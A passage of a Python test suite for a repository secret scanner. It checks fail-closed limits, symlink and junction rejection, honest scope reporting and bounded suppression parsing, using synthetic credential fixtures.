            "password_two=SecondUniqueCredential456\n",
        )
        with mock.patch.object(scanner, "MAX_PATH_REDACTION_VALUES", 1):
            redaction_report = scanner.scan_path(redaction_fixture.root)
        self.assertEqual(2, redaction_report.exit_code)
        self.assertEqual([], redaction_report.findings)
        self.assertEqual("tool.path-redaction-limit", redaction_report.tool_errors[0].code)

        expanded_redaction_fixture = RepositoryFixture(self, git=False)
        expanded_redaction_fixture.write(
            "config.env",
            'password="a' + ("\u200b" * 11) + '"\n',
        )
        with mock.patch.object(scanner, "MAX_PATH_REDACTION_PATTERN_CHARS", 20):
            expanded_report = scanner.scan_path(expanded_redaction_fixture.root)
        self.assertEqual(2, expanded_report.exit_code)
        self.assertEqual([], expanded_report.findings)
        self.assertEqual("tool.path-redaction-limit", expanded_report.tool_errors[0].code)

    def test_req_011_candidate_cap_fails_closed_without_partial_findings(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("one.txt", "ordinary\n")
        fixture.write("two.txt", f"token={synthetic_cloud_key()}\n")

        completed = self.run_scanner(fixture.root, "json", "--max-files", "1")
        report = self.json_report(completed)
        self.assertEqual(2, completed.returncode)
        self.assertEqual([], report["findings"])
        self.assertEqual("tool.file-limit", report["tool_errors"][0]["code"])

    def test_req_011_filesystem_candidate_cap_stops_enumeration_early(self) -> None:
        scanner = load_scanner_module()
        fixture = RepositoryFixture(self, git=False)
        resumed_after_limit = False

        def synthetic_walk(*_args: object, **_kwargs: object) -> object:
            nonlocal resumed_after_limit
            yield os.fspath(fixture.root), [], ["one.txt", "two.txt"]
            resumed_after_limit = True
            raise AssertionError("enumeration resumed after the candidate limit")

        report = scanner.Report()
        with mock.patch.object(scanner.os, "walk", side_effect=synthetic_walk):
            candidates = scanner._filesystem_candidates(fixture.root, False, 1, report)

        self.assertEqual([], candidates)
        self.assertFalse(resumed_after_limit)
        self.assertEqual("tool.file-limit", report.tool_errors[0].code)

    def test_req_011_symlink_root_is_a_tool_error(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "ordinary\n")
        linked_root = fixture.base / "linked-root"
        linked_root.symlink_to(fixture.root, target_is_directory=True)

        completed = self.run_scanner(linked_root)
        report = self.json_report(completed)
        self.assertEqual(2, completed.returncode)
        self.assertEqual("tool.target-symlink", report["tool_errors"][0]["code"])

    @unittest.skipUnless(os.name == "nt", "Windows junction regression")
    def test_req_011_windows_junction_roots_and_components_are_rejected(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("README.md", "ordinary\n")
        outside_directory = fixture.base / "outside"
        outside_directory.mkdir()
        (outside_directory / "secret.txt").write_text(
            "access_token = \"" + synthetic_cloud_key() + "\"\n",
            encoding="utf-8",
        )

        component_junction = fixture.root / "linked"
        root_junction = fixture.base / "root-junction"
        for junction, target in (
            (component_junction, outside_directory),
            (root_junction, fixture.root),
        ):
            created = subprocess.run(
                ["cmd.exe", "/d", "/c", "mklink", "/J", str(junction), str(target)],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                check=False,
            )
            self.assertEqual(0, created.returncode, created.stderr)

        component_scan = self.run_scanner(fixture.root)
        component_report = self.json_report(component_scan)
        self.assertEqual(0, component_scan.returncode)
        self.assertEqual(1, component_report["summary"]["skipped_by_reason"]["symlink"])
        self.assertEqual([], component_report["findings"])

        root_scan = self.run_scanner(root_junction)
        root_report = self.json_report(root_scan)
        self.assertEqual(2, root_scan.returncode)
        self.assertEqual("tool.target-symlink", root_report["tool_errors"][0]["code"])

    def test_req_010_non_git_directory_has_honest_filesystem_scope(self) -> None:
        fixture = RepositoryFixture(self, git=False)
        fixture.write("README.md", "ordinary\n")

        completed = self.run_scanner(fixture.root)
        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertFalse(report["scope"]["git_history_scanned"])
        self.assertEqual("none", report["release_assertion"])

    def test_req_010_missing_git_uses_honest_filesystem_fallback(self) -> None:
        fixture = RepositoryFixture(self)
        fixture.write("README.md", "ordinary\n")
        environment = os.environ.copy()
        environment["PATH"] = ""
        environment["PYTHONDONTWRITEBYTECODE"] = "1"

        completed = subprocess.run(
            [sys.executable, str(SCANNER), str(fixture.root), "--format", "json"],
            cwd=REPOSITORY_ROOT,
            env=environment,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=20,
        )

        report = self.json_report(completed)
        self.assertEqual(0, completed.returncode)
        self.assertEqual("filesystem", report["scope"]["mode"])
        self.assertEqual(["regular-files"], report["scope"]["includes"])
        self.assertFalse(report["scope"]["git_history_scanned"])

    def test_req_011_suppression_application_is_bounded(self) -> None:
        scanner = load_scanner_module()
        count = 12_000
        metadata = (
            'reason="reviewed" owner="app" approved-by="security" '
            'compensating-control="deny rules" expires="2099-01-01"'
        )
        marker = f"vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}"
        findings = [
            scanner.Finding(
                "VW-FIREBASE-PUBLIC-API-KEY",
                "config.js",
                line,
                source_id=b"config.js",
            )
            for line in range(1, count + 1)
        ]
        source = "\n".join(marker for _ in range(count)) + "\n"

        started = time.perf_counter()
        scanner._apply_suppressions(findings, {b"config.js": source})
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 3.0, f"suppression application took {elapsed:.3f}s")
        self.assertTrue(all(finding.suppressed for finding in findings))

    def test_req_011_suppression_metadata_parser_has_a_hard_budget(self) -> None:
        scanner = load_scanner_module()
        line = 'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="' + ("x" * 50_000)

        started = time.perf_counter()
        parsed = scanner._parse_suppression(line)
        elapsed = time.perf_counter() - started

        self.assertLess(elapsed, 0.5, f"suppression parse took {elapsed:.3f}s")
        self.assertEqual(("VW-FIREBASE-PUBLIC-API-KEY", {}), parsed)


if __name__ == "__main__":
    unittest.main()
